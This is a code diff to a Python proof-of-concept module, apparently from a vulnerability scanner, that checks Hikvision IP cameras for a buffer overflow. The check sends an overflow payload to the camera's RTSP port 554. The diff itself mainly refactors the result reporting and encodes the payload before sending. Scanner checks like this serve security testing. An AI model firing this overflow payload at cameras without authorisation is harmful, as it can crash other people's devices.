@@ -2,22 +2,33 @@ import socket
 import time
 
 from urllib.parse import urlparse
+from lib.data import PocResult
 
 
 def audit(target_url: str):
-    if check(target_url):
-        return {
-            "vuln_name": "hikvision ipc overflow vulnerable",
-            "msg": "Found Vulnerable",
-            "poc_name": "hikvision_overflow_01",
-            "vuln_url": target_url
-        }
-    else:
-        return {
-            "msg": "Not Found Vulnerable",
-            "poc_name": "hikvision_overflow_01",
-            "vuln_url": target_url
-        }
+    try:
+        if check(target_url):
+            return PocResult(
+                vuln_name="hikvision ipc overflow vulnerable",
+                msg="Found Vulnerable",
+                poc_name="hikvision_overflow_01",
+                vuln_url=target_url,
+                status=True
+            ).to_dict()
+        else:
+            return PocResult(
+                msg="Not Found Vulnerable",
+                poc_name="hikvision_overflow_01",
+                vuln_url=target_url,
+                status=False
+            ).to_dict()
+    except Exception as e:
+        return PocResult(
+            msg=f"Error: {str(e)}",
+            poc_name="hikvision_overflow_01",
+            vuln_url=target_url,
+            status=False
+        ).to_dict()
 
 
 def check(target_url: str):
@@ -33,7 +44,7 @@ def check(target_url: str):
         sock.connect((host, 554))
     except socket.error:
         return False
-    sock.send(payload)
+    sock.send(payload.encode())
     sock.close()
 
     time.sleep(0.2)
